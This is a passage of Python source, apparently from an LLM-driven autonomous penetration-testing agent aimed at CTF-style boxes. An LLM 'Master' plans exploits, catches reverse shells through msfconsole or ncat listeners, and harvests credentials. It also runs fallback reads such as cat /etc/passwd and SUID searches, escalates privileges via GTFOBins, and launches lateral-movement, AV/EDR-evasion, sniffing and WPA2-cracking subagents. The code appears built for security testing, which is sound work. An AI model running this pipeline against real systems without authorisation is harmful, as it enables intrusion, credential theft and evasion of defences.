                # `set LHOST X` (msfconsole RC) → `set LHOST <ours>`
                _args = _re.sub(
                    r"\bset\s+LHOST\s+\S+",
                    f"set LHOST {lhost}",
                    _args, flags=_re.IGNORECASE,
                )
                _args = _re.sub(
                    r"\bset\s+LPORT\s+\d+",
                    f"set LPORT {lport}",
                    _args, flags=_re.IGNORECASE,
                )

                async def _fire(_lhost, _lport):
                    return await agent.execute_tasks(
                        target,
                        [{"tool": vi["tool"], "args": _args,
                          "purpose": vector.get("description", ""),
                          "timeout": vector.get("timeout", 300),
                          "can_parallel": False}],
                        f"EXPLOIT_V{i+1}", self._intel,
                    )

                try:
                    cap = await lm.fire_and_capture(
                        run_exploit_coro = _fire,
                        backend = None,         # auto: msfconsole > ncat > nc
                        lport   = lport,
                        timeout = float(vector.get("timeout", 60) or 60),
                        rhost   = target,
                    )
                    captured = bool(cap.get("captured"))
                    # We need a 'result' shape for the evaluator below.
                    result = {
                        "stdout":    cap.get("evidence", "")[:4096],
                        "stderr":    "",
                        "exit_code": 0 if captured else 1,
                        "tool":      vi["tool"],
                        "args":      _args,
                        "listener":  {
                            "session_id": cap.get("session_id"),
                            "captured":   captured,
                            "user":       cap.get("user"),
                            "lport":      cap.get("lport"),
                        },
                    }
                except Exception as _le_exc:
                    await self.emit_reasoning(
                        step       = f"listener_err_{i+1}",
                        reasoning  = f"Listener error (falling back to direct fire): {_le_exc}",
                        decision   = "Run exploit without listener capture",
                        next_action= vi.get("command", ""),
                    )
                    result = await agent.execute_tasks(
                        target,
                        [{"tool": vi["tool"], "args": vi.get("args", ""),
                          "purpose": vector.get("description", ""),
                          "timeout": vector.get("timeout", 300),
                          "can_parallel": False}],
                        f"EXPLOIT_V{i+1}", self._intel,
                    )
            else:
                # Plain exploit: no callback expected.  Single task: Master
                # specified exactly one tool + args.
                result = await agent.execute_tasks(
                    target,
                    [{"tool": vi["tool"], "args": vi.get("args", ""),
                      "purpose": vector.get("description", ""),
                      "timeout": vector.get("timeout", 300),
                      "can_parallel": False}],
                    f"EXPLOIT_V{i+1}", self._intel,
                )

            # Master evaluates the result
            eval_r = self._safe_llm_result(
                await self._llm_evaluate_exploit_result(target, vector, result))
            await self.emit_reasoning(
                step       = f"exploit_eval_{i+1}",
                reasoning  = eval_r.get("reasoning",""),
                decision   = f"Shell: {eval_r.get('shell_obtained',False)}",
                next_action= eval_r.get("next_step","Try next vector"),
                data       = eval_r
            )

            # Extract credentials / files from eval
            for c in _safe_list(eval_r.get("credentials_found")):
                if isinstance(c, dict):
                    entry = {"service": c.get("service", vector.get("type","")),
                             "user": c.get("user",""), "pass": c.get("pass",""),
                             "result": "valid"}
                    if entry not in self._intel["default_creds_tried"]:
                        self._intel["default_creds_tried"].append(entry)
            for f in _safe_list(eval_r.get("files_accessible")):
                if f not in self._intel["interesting_files"]:
                    self._intel["interesting_files"].append(f)
            if eval_r.get("useful_info"):
                self._intel["enum_findings"].append(
                    f"[{vi.get('tool','')}] {_safe_str(eval_r.get('useful_info'))[:200]}")

            if eval_r.get("store_finding") and eval_r.get("finding_title"):
                sev_map = {"critical": FindingSeverity.CRITICAL,"high": FindingSeverity.HIGH,
                           "medium": FindingSeverity.MEDIUM,"low": FindingSeverity.LOW}
                await self.store_finding(
                    severity    = sev_map.get(eval_r.get("finding_severity","medium"), FindingSeverity.MEDIUM),
                    title       = _safe_str(eval_r.get("finding_title")),
                    description = eval_r.get("reasoning","")[:500],
                    host        = target, tool_used = vi.get("tool",""),
                    evidence    = result.get("stdout","")[:1000]
                )

            if eval_r.get("shell_obtained"):
                # Recommendation A — route through the centralized helper so
                # plan_step_update / pivot_event / success_memory / attack_path
                # all stay in lockstep regardless of who registers the shell.
                await self.register_shell(
                    source   = "master_exploit_phase",
                    user     = eval_r.get("user") or "unknown",
                    host     = target,
                    method   = vi.get("tool", ""),
                    evidence = eval_r.get("reasoning", "")[:300],
                )
                if eval_r.get("user_flag"):
                    self._intel["user_flag"] = str(eval_r["user_flag"])
                    await self.store_flag("user", str(eval_r["user_flag"]), "/home/*/user.txt")
                await self._store_success_memory("exploit_pattern", {
                    "os": self._intel.get("os_guess","?"),
                    "services": _fmt_svcs(self._intel.get("services",{}))[:200],
                    "vector": vector.get("description","")[:200]
                }, ["exploit","shell",self._intel.get("os_guess","unknown").lower()])
                break
            else:
                fail_result = f"{vi.get('tool','')} → {eval_r.get('reasoning','')[:120]}"
                self._intel["attack_path"].append({
                    "phase":"exploit",
                    "result": fail_result,
                    "ts": datetime.utcnow().isoformat()
                })
                await self._emit("plan_step_update", {
                    "step_id": f"exploit_v{i+1}",
                    "label":   vec_label,
                    "icon":    "💥",
                    "status":  "failed",
                    "result":  fail_result,
                    "detail":  eval_r.get("reasoning","")[:200],
                    "found":   False,
                    "ts":      datetime.utcnow().isoformat()
                })

        if not self._intel["shell_access"]:
            # Store partial wins
            for c in [c for c in self._intel.get("default_creds_tried",[])
                      if c.get("result","").lower() in ("success","valid")]:
                await self.store_finding(
                    severity=FindingSeverity.HIGH,
                    title=f"Valid Credentials: {c.get('service','?')} — {c.get('user','?')}",
                    description=f"Credentials: {c.get('user','')}:{c.get('pass','')}",
                    host=target, tool_used="exploit_phase")
            for s in [s for s in self._intel.get("shares",[])
                      if "READ" in s.upper() or "OK" in s.upper()]:
                await self.store_finding(
                    severity=FindingSeverity.MEDIUM,
                    title=f"Readable SMB Share: {s}",
                    description="Accessible without authentication",
                    host=target, tool_used="smbclient")
            await self.emit_reasoning(
                step="exploit_complete", reasoning="All vectors exhausted",
                decision="No shell obtained — partial findings stored",
                next_action="Review findings board")

        # ── Fire exploit subagents in background (ExploitOrchestrator) ──
        # Passes gathered intel as prior context so subagents target
        # the best vectors without re-running from scratch.
        await self._run_phase_subagents("exploit", target)

    # ─── Live-session verification (anti-hallucination) ───────────────
    async def _verify_remote_session(self) -> bool:
        """Prove a live, drivable session executes a command ON THE TARGET.

        ``shell_access == True`` is NOT sufficient — a falsely-registered shell
        (e.g. the exploit_synth false-positive, which flips the flag but creates
        no session in intel['shells']) would otherwise drive post-exploit/privesc
        subagents that run ``cat``/``id``/``grep`` via the LOCAL MCP ``bash`` tool
        and mislabel the Kali host's output as the target.  We require an actual
        non-pending session AND that a unique marker round-trips through the real
        session router (``_execute_shell_command``).
        """
        shells = [s for s in (self._intel.get("shells") or [])
                  if isinstance(s, dict) and not s.get("pending")]
        if not shells:
            return False
        import uuid as _uuid
        marker = f"ARGUS_LIVE_{_uuid.uuid4().hex[:10]}"
        try:
            res = await self._execute_shell_command(command=f"echo {marker}", timeout=20)
            out = (res or {}).get("stdout", "") if isinstance(res, dict) else str(res or "")
            return marker in (out or "")
        except Exception:
            return False

    # ─── PHASE: Post-Exploitation ─────────────────────────────

    async def _phase_post_exploit(self, target: str):
        """Master plans post-exploit enumeration. Agent executes."""
        await self._advance_phase(AttackPhase.POST_EXPLOIT)

        # ── F3 anti-hallucination gate ──────────────────────────────
        # If shell_access is set but NO live session can actually run a marker
        # on the target, the "shell" is fake (e.g. exploit_synth false-positive).
        # Running post-exploit anyway executes cat/id/grep on the LOCAL Kali box
        # and reports them as the target (the "thought it had a shell but was
        # completely off" bug).  Correct the flag and refuse.
        if self._intel.get("shell_access") and not await self._verify_remote_session():
            self._intel["shell_access"] = False
            await self.emit_reasoning(
                step       = "post_exploit_unverified_session",
                reasoning  = ("shell_access was set but no live remote session could "
                              "execute a marker on the target — the foothold is "
                              "unverified/fake.  Refusing to run post-exploit locally."),
                decision   = "SKIP POST_EXPLOIT (unverified session); reset shell_access",
                next_action= "Establish a REAL session (reverse shell / SSH) before post-ex",
            )

        # ── Foothold gate (Overpass-3 post-mortem) ──────────────────
        # POST_EXPLOIT enumeration + the lateral AD subagents only make
        # sense once we actually have a foothold.  On the Overpass-3
        # run this phase executed with shell_access=False and ran
        # enum4linux/kerberos/ntlm against a Linux host with no shell —
        # pure waste.  Skip the whole phase unless we have a shell OR
        # harvested credentials to act on.
        has_shell = bool(self._intel.get("shell_access"))
        has_creds = bool(self._intel.get("credentials"))
        if not has_shell and not has_creds:
            await self.emit_reasoning(
                step       = "post_exploit_skip_no_foothold",
                reasoning  = (
                    "POST_EXPLOIT skipped — no shell access and no harvested "
                    "credentials.  Post-exploit enumeration + lateral movement "
                    "require a foothold first.  Returning to exploitation "
                    "instead of running blind enumeration."
                ),
                decision   = "SKIP POST_EXPLOIT (no foothold)",
                next_action= "Continue exploitation attempts to establish a foothold",
            )
            await self._emit("plan_step_update", {
                "step_id": "post_exploit", "status": "skipped",
                "result":  "No foothold yet — post-exploit deferred",
                "detail":  "", "found": False, "ts": datetime.utcnow().isoformat()
            })
            return

        await self._emit("plan_step_update", {
            "step_id": "post_exploit", "status": "active",
            "result":  f"Harvesting credentials and mapping network as {self._intel.get('current_user','?')}",
            "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
        })

        from agents.privesc_agent import PrivescAgent
        agent = PrivescAgent(broadcast=self.broadcast)
        agent._session_id = self._session_id

        post_plan = self._safe_llm_result(await self._llm_plan_post_exploit(target))
        await self.emit_reasoning(
            step       = "post_exploit_planning",
            reasoning  = post_plan.get("reasoning",""),
            decision   = f"Goals: {post_plan.get('goals',[])}",
            next_action= "Enumerate system, harvest credentials, map network"
        )
        tasks = [
            {"tool": s["tool"], "args": s.get("args",""),
             "purpose": s.get("purpose",""), "timeout": s.get("timeout",60),
             "can_parallel": True}
            for s in _safe_list(post_plan.get("steps")) if s.get("tool")
        ] or [
            {"tool":"id","args":"","purpose":"Current user","timeout":5,"can_parallel":True},
            {"tool":"cat","args":"/etc/passwd","purpose":"User list","timeout":5,"can_parallel":True},
            {"tool":"find","args":"/ -name '*.conf' -readable 2>/dev/null | head -20",
             "purpose":"Config files","timeout":30,"can_parallel":True},
        ]

        result = await agent.execute_tasks(target, tasks, "POST_EXPLOIT", self._intel)
        for cred in result.get("credentials",[]):
            if cred not in self._intel["credentials"]: self._intel["credentials"].append(cred)
        for u in result.get("users",[]):
            if u not in self._intel["users"]: self._intel["users"].append(u)
        for f in result.get("interesting_files",[]):
            if f not in self._intel["interesting_files"]: self._intel["interesting_files"].append(f)
        self._merge_raw_outputs(result.get("raw_outputs",{}))
        self._intel["attack_path"].append({
            "phase":"post_exploit",
            "result": f"Creds: {len(result.get('credentials',[]))} | Files: {len(result.get('interesting_files',[]))}",
            "ts": datetime.utcnow().isoformat()
        })

        # ── Fire post-exploit subagents (cred harvest, exfil, persistence) ──
        await self._run_phase_subagents("post", target)

    # ─── PHASE: Privilege Escalation ──────────────────────────

    async def _phase_privesc(self, target: str):
        """
        Master-directed privilege escalation.
        Master plans each privesc vector. PrivescAgent executes exactly
        what Master specifies and extracts findings. Master evaluates
        and plans next step. Continues until root or vectors exhausted.
        """
        await self._advance_phase(AttackPhase.PRIVESC)

        # ── F3 anti-hallucination gate (same as post-exploit) ───────
        # Privesc enumerators run id/find/cat etc. via the LOCAL MCP bash tool.
        # Without a verified live session on the target they enumerate the Kali
        # host and "confirm root" on ourselves.  Refuse unless a marker round-
        # trips through a real session.
        if not await self._verify_remote_session():
            self._intel["shell_access"] = False
            await self.emit_reasoning(
                step       = "privesc_unverified_session",
                reasoning  = ("No live remote session could execute a marker on the "
                              "target — skipping privilege escalation to avoid "
                              "enumerating (and 'confirming root' on) the local host."),
                decision   = "SKIP PRIVESC (unverified session)",
                next_action= "Establish a REAL session before privilege escalation",
            )
            await self._emit("plan_step_update", {
                "step_id": "privesc", "status": "skipped",
                "result":  "No verified remote session — privesc deferred",
                "detail":  "", "found": False, "ts": datetime.utcnow().isoformat()
            })
            return

        await self._emit("plan_step_update", {
            "step_id": "privesc", "status": "active",
            "result":  f"Attempting privilege escalation as {self._intel.get('current_user','unknown')}",
            "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
        })

        from agents.privesc_agent import PrivescAgent
        agent = PrivescAgent(broadcast=self.broadcast)
        agent._session_id = self._session_id
        self._privesc_agent = agent

        # ── Round 1: Master plans initial enumeration ─────────
        privesc_plan = self._safe_llm_result(await self._llm_plan_privesc(target))
        await self.emit_reasoning(
            step       = "privesc_planning",
            reasoning  = privesc_plan.get("reasoning",""),
            decision   = f"Vectors: {privesc_plan.get('vectors',[])}",
            next_action= f"{len(privesc_plan.get('steps',[]))} tasks"
        )
        tasks = [
            {"tool": s["tool"], "args": s.get("args",""),
             "purpose": s.get("purpose",""), "timeout": s.get("timeout",120),
             "can_parallel": True}
            for s in _safe_list(privesc_plan.get("steps")) if s.get("tool")
        ] or [
            {"tool":"sudo","args":"-l","purpose":"Check sudo rights","timeout":10,"can_parallel":True},
            {"tool":"find","args":"/ -perm -u=s -type f 2>/dev/null","purpose":"SUID binaries","timeout":60,"can_parallel":True},
            {"tool":"uname","args":"-a","purpose":"Kernel version","timeout":5,"can_parallel":True},
            {"tool":"getcap","args":"-r / 2>/dev/null","purpose":"Capabilities","timeout":30,"can_parallel":True},
        ]

        result = await agent.execute_tasks(target, tasks, "PRIVESC", self._intel)
        self._merge_raw_outputs(result.get("raw_outputs",{}))

        # ── Master evaluates and may run a second round ───────
        privesc_eval = self._safe_llm_result(await self._llm_evaluate_privesc(target, result))
        await self.emit_reasoning(
            step       = "privesc_eval_1",
            reasoning  = privesc_eval.get("reasoning",""),
            decision   = f"Root: {privesc_eval.get('root_obtained',False)}",
            next_action= privesc_eval.get("next_step",""),
            data       = privesc_eval
        )

        if not privesc_eval.get("root_obtained") and privesc_eval.get("next_step"):
            # Master plans follow-up exploitation of specific vectors
            followup_plan = self._safe_llm_result(await self.think_json(
                f"""Based on this privesc enumeration for {target}:
SUID binaries: {result.get('suid_files',[])}
Sudo rights: {result.get('sudo_rights','')}
Kernel: {result.get('kernel','')}
GTFOBins candidates: {privesc_eval.get('gtfobins_candidates',[])}
Next step suggested: {privesc_eval.get('next_step','')}

Plan the exact exploitation command(s) to escalate privileges.
Return JSON:
{{
  "tasks": [
    {{"tool":"tool_name","args":"exact args","purpose":"what this does","timeout":30,"can_parallel":false}}
  ]
}}"""
            ))
            followup_tasks = [
                {"tool": t["tool"], "args": t.get("args",""),
                 "purpose": t.get("purpose",""), "timeout": t.get("timeout",60),
                 "can_parallel": False}
                for t in _safe_list(followup_plan.get("tasks")) if t.get("tool")
            ]
            if followup_tasks:
                await self.emit_reasoning(
                    step       = "privesc_exploit_attempt",
                    reasoning  = privesc_eval.get("next_step",""),
                    decision   = f"Executing {len(followup_tasks)} privesc exploit tasks",
                    next_action= followup_tasks[0].get("purpose","")
                )
                result2 = await agent.execute_tasks(target, followup_tasks, "PRIVESC_EXPLOIT", self._intel)
                self._merge_raw_outputs(result2.get("raw_outputs",{}))

                privesc_eval2 = self._safe_llm_result(await self._llm_evaluate_privesc(target, result2))
                await self.emit_reasoning(
                    step       = "privesc_eval_2",
                    reasoning  = privesc_eval2.get("reasoning",""),
                    decision   = f"Root: {privesc_eval2.get('root_obtained',False)}",
                    next_action= privesc_eval2.get("next_step","")
                )
                privesc_eval = privesc_eval2

        if privesc_eval.get("root_obtained"):
            self._intel["current_user"] = "root"
            await self._store_success_memory("privesc_pattern", {
                "os": self._intel.get("os_guess","?"),
                "method": privesc_eval.get("reasoning","")[:200]
            }, ["privesc","root",self._intel.get("os_guess","linux").lower()])

        rf = privesc_eval.get("root_flag") or result.get("root_flag")
        if rf:
            self._intel["root_flag"] = str(rf)
            await self.store_flag("root", str(rf), "/root/root.txt")
        privesc_result = ("Root obtained via " + privesc_eval.get("reasoning","")[:100])             if privesc_eval.get("root_obtained") else "PrivEsc attempted — no root"
        self._intel["attack_path"].append({
            "phase":"privesc",
            "result": privesc_result,
            "ts": datetime.utcnow().isoformat()
        })
        await self._emit("plan_step_update", {
            "step_id": "privesc",
            "status":  "done" if privesc_eval.get("root_obtained") else "failed",
            "result":  privesc_result,
            "detail":  privesc_eval.get("reasoning","")[:200],
            "found":   bool(privesc_eval.get("root_obtained")),
            "ts":      datetime.utcnow().isoformat()
        })

        # ── Fire privesc subagents in background ───────────────
        await self._run_phase_subagents("privesc", target)

    # ─── PHASE: Attack Planning (Attack Planner Agent) ──────

    async def _phase_attack_planning(self, target: str) -> Optional[Dict]:
        """
        Attack Planner: generates an attack tree, ranks exploit paths,
        and picks the optimal chain based on all gathered intel.
        Returns the attack tree dict or None if planning fails.
        """
        await self.set_status(AgentStatus.THINKING, "Attack Planner: generating attack tree")

        # Pull long-term memories for this target type + discovered services
        svc_tags = []
        for svc in self._intel.get("services", {}).values():
            svc_name = svc.get("service","") if isinstance(svc, dict) else str(svc)
            if svc_name:
                svc_tags.append(svc_name.lower().split("/")[0])

        mem_ctx = await self._recall_relevant_memories(
            target_type = self._intel.get("target_type", "unknown"),
            tags        = _dedup_strings(svc_tags[:5] + ["exploit", "initial_access"])
        )

        intel_ctx   = self._intel_summary()
        kb          = await self._kb(
            f"attack tree exploit chain {_fmt_svcs(self._intel.get('services',{}))} "
            f"{_safe_join(self._intel.get('cves',[])[:5])}",
            top_k=4
        )

        prompt = f"""You are an expert Attack Planner for penetration testing.
Your job is to generate a structured attack tree — a ranked set of exploit chains
from initial access through to objective (root/data/flags).

{intel_ctx}

{mem_ctx}

{kb}

ATTACK TREE REQUIREMENTS:
- Each node represents one step in the attack
- Rank paths by probability of success (0.0 to 1.0)
- The optimal_path should be the highest-probability complete chain
- Use ONLY techniques applicable to the discovered services and versions
- Include MITRE ATT&CK technique IDs for each node

Return JSON:
{{
  "assessment_summary": "One paragraph: what was found and overall attack surface",
  "attack_nodes": [
    {{
      "id": "n1",
      "step": "Initial Access",
      "technique": "Exploit Apache 2.4.49 CVE-2021-41773",
      "tool": "curl",
      "mitre_id": "T1190",
      "mitre_name": "Exploit Public-Facing Application",
      "probability": 0.85,
      "requires": [],
      "produces": "RCE as www-data"
    }},
    {{
      "id": "n2",
      "step": "Privilege Escalation",
      "technique": "sudo misconfiguration",
      "tool": "sudo -l then GTFOBins",
      "mitre_id": "T1548",
      "mitre_name": "Abuse Elevation Control Mechanism",
      "probability": 0.7,
      "requires": ["n1"],
      "produces": "root shell"
    }}
  ],
  "attack_chains": [
    {{
      "chain_id": "c1",
      "path": ["n1", "n2"],
      "description": "Apache RCE → sudo privesc",
      "combined_probability": 0.6,
      "entry_point": "port 80/443",
      "objective": "root"
    }}
  ],
  "optimal_path": ["n1", "n2"],
  "optimal_chain_id": "c1",
  "reasoning": "Why this path is most likely to succeed",
  "alternative_paths": ["c2: FTP anon → writable cron"],
  "immediate_actions": [
    "1. Test CVE-2021-41773 on port 80",
    "2. If successful, check sudo -l"
  ]
}}"""

        try:
            tree = await self.think_json(prompt)
        except Exception as e:
            await self.emit_reasoning(
                step       = "attack_planning_failed",
                reasoning  = f"Attack planner error: {e}",
                decision   = "Proceeding without formal attack tree",
                next_action= "Use intel-guided exploitation"
            )
            return None

        if tree.get("parse_error"):
            return None

        # Persist attack tree to DB
        if self._session_id:
            try:
                await db.store_attack_tree(self._session_id, tree)
            except Exception:
                pass

        # Map MITRE techniques from the tree
        for node in _safe_list(tree.get("attack_nodes")):
            if node.get("mitre_id") and node.get("mitre_name"):
                self._intel["mitre_techniques"].append({
                    "id":     node["mitre_id"],
                    "name":   node["mitre_name"],
                    "tactic": node.get("step",""),
                    "tool":   node.get("tool","")
                })

        await self.emit_reasoning(
            step       = "attack_tree_generated",
            reasoning  = tree.get("assessment_summary", "Attack tree generated"),
            decision   = f"Optimal path: {' → '.join(tree.get('optimal_path', []))}",
            next_action= "\n".join(_safe_list(tree.get("immediate_actions"))[:3]),
            data       = {
                "nodes":    len(tree.get("attack_nodes", [])),
                "chains":   len(tree.get("attack_chains", [])),
                "optimal":  tree.get("optimal_chain_id"),
            }
        )

        await self._emit("attack_tree_ready", {
            "tree":    tree,
            "session": self._session_id
        })

        self._intel["attack_path"].append({
            "phase":  "attack_planning",
            "result": f"Attack tree: {len(tree.get('attack_nodes',[]))} nodes, optimal: {tree.get('optimal_chain_id','')}",
            "ts":     datetime.utcnow().isoformat()
        })

        return tree

    # ─── PHASE: Lateral Movement ──────────────────────────────

    async def _phase_lateral_movement(self, target: str):
        """
        Lateral Movement: AD/domain enumeration, Kerberos attacks, NTLM relay/capture.
        Uses LateralAgent (AdEnumSubagent → KerberosSubagent + NtlmCaptureSubagent).
        Falls back to basic internal network scan if no domain context.
        """
        await self._advance_phase(AttackPhase.POST_EXPLOIT)
        await self.emit_reasoning(
            step       = "lateral_movement_start",
            reasoning  = f"Shell obtained as {self._intel.get('current_user','?')}. Pivoting to lateral movement — AD enum, Kerberos, NTLM capture.",
            decision   = "Run LateralAgent: AD enumeration → Kerberos attacks + NTLM relay in parallel",
            next_action= "LateralAgent dispatching subagents"
        )

        # ── Pull domain context from intel ────────────────────────────
        domain   = self._intel.get("domain", "")
        dc_ip    = self._intel.get("dc_ip", "")
        username = ""
        password = ""
        hashes   = ""
        creds = self._intel.get("credentials", []) + [
            c for c in self._intel.get("default_creds_tried", [])
            if c.get("result", "") in ("success", "valid")
        ]
        if creds:
            best = creds[0]
            username = best.get("username", "") or best.get("user", "")
            password = best.get("password", "") or best.get("pass", "")
            hashes   = best.get("hashes", "") or best.get("hash", "")

        interface = self._intel.get("interface", "eth0")

        from agents.lateral.lateral_agent import LateralAgent
        agent = LateralAgent(broadcast=self.broadcast)
        try:
            await agent.run(
                session_id = self._session_id,
                target     = target,
                domain     = domain,
                dc_ip      = dc_ip,
                username   = username,
                password   = password,
                hashes     = hashes,
                interface  = interface,
            )
        except Exception as exc:
            await self.emit_reasoning(
                step       = "lateral_agent_error",
                reasoning  = f"LateralAgent error: {exc}",
                decision   = "Continuing with available intel",
                next_action= "Proceed to evidence collection"
            )

        # ── Attach any lateral targets discovered to attack graph ─────
        new_hosts = self._intel.get("lateral_targets", [])
        if new_hosts:
            await self.emit_reasoning(
                step       = "lateral_hosts_found",
                reasoning  = f"Lateral movement phase found {len(new_hosts)} additional host(s)",
                decision   = f"Pivot targets: {new_hosts[:5]}",
                next_action= "Attack graph updated"
            )
            for host in new_hosts[:10]:
                await self.add_node(
                    node_id  = f"lateral_{host.replace('.','_')}",
                    type     = "host",
                    label    = host,
                    host     = host,
                    metadata = {"role": "lateral_target", "discovered_from": target}
                )
                await self.add_edge(
                    source = f"target_{target.replace('.','_').replace('/','_')}",
                    target = f"lateral_{host.replace('.','_')}",
                    label  = "lateral_movement",
                    tool   = "lateral_agent"
                )
            await self._capture_evidence(
                phase        = "lateral_movement",
                evidence_type= "command_transcript",
                title        = f"Lateral movement: {len(new_hosts)} pivot target(s)",
                content      = f"Target: {target}\nDomain: {domain or 'N/A'}\nPivot hosts: {new_hosts}",
                severity     = "high",
                mitre_tech   = "T1021"
            )
        else:
            await self.emit_reasoning(
                step       = "lateral_movement_complete",
                reasoning  = "Lateral movement phase complete — no additional pivot targets identified",
                decision   = "Single-host or non-domain environment",
                next_action= "Proceed to evidence collection"
            )

        await self._map_mitre("lateral_agent", success=bool(new_hosts), host=target)
        self._intel["attack_path"].append({
            "phase":  "lateral_movement",
            "result": f"LateralAgent: {len(new_hosts)} pivot targets; domain={domain or 'none'}",
            "ts":     datetime.utcnow().isoformat()
        })

        # ── Fire lateral subagents in background ────────────────────
        await self._run_phase_subagents("lateral", target)

    # ─── PHASE: Cloud Infrastructure ─────────────────────────

    async def _phase_cloud(self, target: str):
        """Cloud infrastructure enumeration — AWS, Azure, GCP."""
        await self.emit_reasoning(
            step       = "cloud_enum_start",
            reasoning  = "Cloud services detected. Enumerating AWS/Azure/GCP metadata and misconfigurations.",
            decision   = "Run CloudAgent: AwsEnum + AzureEnum + GcpEnum in parallel",
            next_action= "CloudAgent dispatching subagents"
        )
        from agents.cloud.cloud_agent import CloudAgent
        agent = CloudAgent(broadcast=self.broadcast)
        try:
            await agent.run(session_id=self._session_id, target=target)
        except Exception as exc:
            await self.emit_reasoning(
                step="cloud_agent_error", reasoning=f"CloudAgent error: {exc}",
                decision="Continuing", next_action="Cloud phase skipped"
            )
        self._intel["attack_path"].append({
            "phase": "cloud", "result": "CloudAgent executed",
            "ts": datetime.utcnow().isoformat()
        })

    # ─── PHASE: Container Security ────────────────────────────

    async def _phase_container(self, target: str):
        """Docker / Kubernetes security audit."""
        await self.emit_reasoning(
            step       = "container_audit_start",
            reasoning  = "Container platform detected. Auditing Docker and Kubernetes security posture.",
            decision   = "Run ContainerAgent: DockerAudit + K8sAudit",
            next_action= "ContainerAgent dispatching subagents"
        )
        from agents.container.container_agent import ContainerAgent
        agent = ContainerAgent(broadcast=self.broadcast)
        try:
            await agent.run(session_id=self._session_id, target=target)
        except Exception as exc:
            await self.emit_reasoning(
                step="container_agent_error", reasoning=f"ContainerAgent error: {exc}",
                decision="Continuing", next_action="Container phase skipped"
            )
        self._intel["attack_path"].append({
            "phase": "container", "result": "ContainerAgent executed",
            "ts": datetime.utcnow().isoformat()
        })

    # ─── PHASE: AV/EDR Evasion ────────────────────────────────

    async def _phase_evasion(self, target: str):
        """AV/EDR defense enumeration and evasion techniques."""
        os_type = "windows" if "windows" in self._intel.get("os_guess", "").lower() else "linux"
        lhost   = self._intel.get("lhost", "LHOST")
        lport   = int(self._intel.get("lport", 4444))
        await self.emit_reasoning(
            step       = "evasion_start",
            reasoning  = f"Shell obtained on {os_type.upper()} system. Enumerating defenses and applying evasion.",
            decision   = "Run EvasionAgent: DefenseEnum → AvEvasion + (AMSI bypass on Windows)",
            next_action= "EvasionAgent dispatching subagents"
        )
        from agents.evasion.evasion_agent import EvasionAgent
        agent = EvasionAgent(broadcast=self.broadcast)
        try:
            await agent.run(
                session_id=self._session_id, target=target,
                os_type=os_type, lhost=lhost, lport=lport
            )
        except Exception as exc:
            await self.emit_reasoning(
                step="evasion_agent_error", reasoning=f"EvasionAgent error: {exc}",
                decision="Continuing", next_action="Evasion phase skipped"
            )
        self._intel["attack_path"].append({
            "phase": "evasion", "result": f"EvasionAgent executed (os={os_type})",
            "ts": datetime.utcnow().isoformat()
        })

    # ─── PHASE: Traffic Analysis ──────────────────────────────

    async def _phase_traffic(self, target: str):
        """Passive traffic capture and credential sniffing."""
        interface = self._intel.get("interface", "eth0")
        await self.emit_reasoning(
            step       = "traffic_analysis_start",
            reasoning  = "Starting passive traffic capture for credential sniffing and protocol analysis.",
            decision   = "Run TrafficAgent: PcapCapture + CredentialSniff in parallel",
            next_action= "TrafficAgent dispatching subagents"
        )
        from agents.traffic.traffic_agent import TrafficAgent
        agent = TrafficAgent(broadcast=self.broadcast)
        try:
            await agent.run(
                session_id=self._session_id, target=target,
                interface=interface, duration=30
            )
        except Exception as exc:
            await self.emit_reasoning(
                step="traffic_agent_error", reasoning=f"TrafficAgent error: {exc}",
                decision="Continuing", next_action="Traffic phase skipped"
            )
        self._intel["attack_path"].append({
            "phase": "traffic", "result": "TrafficAgent executed",
            "ts": datetime.utcnow().isoformat()
        })

    # ─── PHASE: Forensics (deep evidence) ────────────────────

    async def _phase_forensics_deep(self, target: str):
        """Digital forensics — artifact collection, timeline, memory analysis."""
        os_type      = "windows" if "windows" in self._intel.get("os_guess", "").lower() else "linux"
        attack_start = self._intel.get("session_start", "")
        await self.emit_reasoning(
            step       = "forensics_start",
            reasoning  = f"Running forensic collection on {os_type.upper()} target for artifact preservation.",
            decision   = "Run ForensicsAgent: ArtifactCollect → Timeline + MemoryAnalysis",
            next_action= "ForensicsAgent dispatching subagents"
        )
        from agents.forensics.forensics_agent import ForensicsAgent
        agent = ForensicsAgent(broadcast=self.broadcast)
        try:
            await agent.run(
                session_id=self._session_id, target=target,
                os_type=os_type, attack_start=attack_start
            )
        except Exception as exc:
            await self.emit_reasoning(
                step="forensics_agent_error", reasoning=f"ForensicsAgent error: {exc}",
                decision="Continuing", next_action="Forensics phase skipped"
            )
        self._intel["attack_path"].append({
            "phase": "forensics", "result": "ForensicsAgent executed",
            "ts": datetime.utcnow().isoformat()
        })

    # ─── PHASE: Enhanced Evidence Collection ──────────────────

    async def _phase_evidence_enhanced(self, target: str):
        """Screenshot capture and flag/proof harvesting via EvidenceAgent."""
        os_type = "windows" if "windows" in self._intel.get("os_guess", "").lower() else "linux"
        web_ports = [p for p, s in self._intel.get("services", {}).items()
                     if ("http" in str(s).lower())]
        web_urls  = [f"http://{target}:{p}" for p in web_ports[:3]]
        await self.emit_reasoning(
            step       = "evidence_enhanced_start",
            reasoning  = f"Harvesting screenshots and flags from {os_type.upper()} target.",
            decision   = "Run EvidenceAgent: Screenshot + FlagCapture in parallel",
            next_action= "EvidenceAgent dispatching subagents"
        )
        from agents.evidence.evidence_agent import EvidenceAgent
        agent = EvidenceAgent(broadcast=self.broadcast)
        try:
            await agent.run(
                session_id=self._session_id, target=target,
                os_type=os_type, web_urls=web_urls
            )
        except Exception as exc:
            await self.emit_reasoning(
                step="evidence_agent_error", reasoning=f"EvidenceAgent error: {exc}",
                decision="Continuing", next_action="Enhanced evidence phase skipped"
            )
        self._intel["attack_path"].append({
            "phase": "evidence_enhanced", "result": "EvidenceAgent executed",
            "ts": datetime.utcnow().isoformat()
        })

    # ─── PHASE: Wireless Assessment ───────────────────────────

    async def _phase_wireless(self, target: str):
        """Wireless security assessment — WiFi scan, WPA2 crack, evil twin."""
        wireless_cfg = self._intel.get("wireless_config", {})
        await self.emit_reasoning(
            step       = "wireless_start",
            reasoning  = "Wireless assessment requested. Running WiFi enumeration and attack modules.",
            decision   = "Run WirelessAgent: WifiScan → Wpa2Crack (+ EvilTwin if configured)",
            next_action= "WirelessAgent dispatching subagents"
        )
        from agents.wireless.wireless_agent import WirelessAgent
        agent = WirelessAgent(broadcast=self.broadcast)
        try:
            await agent.run(
                session_id   = self._session_id,
                target       = target,
                interface    = wireless_cfg.get("interface", "wlan0"),
                target_bssid = wireless_cfg.get("bssid", ""),
